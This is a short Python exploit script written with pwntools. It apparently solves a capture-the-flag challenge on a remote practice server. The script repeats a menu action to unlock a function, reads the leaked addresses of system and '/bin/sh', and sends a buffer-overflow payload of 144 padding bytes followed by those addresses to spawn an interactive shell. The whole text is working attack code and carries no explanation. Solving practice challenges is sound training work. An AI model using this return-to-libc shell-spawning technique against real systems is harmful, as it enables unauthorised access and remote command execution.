#!/usr/bin/python3

from pwn import *

def EarnMoney():
    p.sendlineafter(menu, "2")
    p.sendlineafter(menu, "3")

p = remote("ctf.j0n9hyun.xyz", 3010)

padding = b"A"*144
menu = ">>> "

log.info("Program is Started...")
for i in range(8):
    EarnMoney()

p.sendlineafter(menu, "3")
p.recvuntil(": ")
system = int(p.recvuntil("\n").decode('utf-8').strip("\n"), 16)

p.sendlineafter(menu, "4")
p.recvuntil(": ")
binsh = int(p.recvuntil("\n").decode('utf-8').strip("\n"), 16)

p.sendlineafter(menu, "5")
payload = padding
payload += p32(system)
payload += b"BBBB"
payload += p32(binsh)
p.sendlineafter("> ", payload)

log.info("system located: " + hex(system))
log.info("/bin/sh located: " + hex(binsh))
p.interactive()
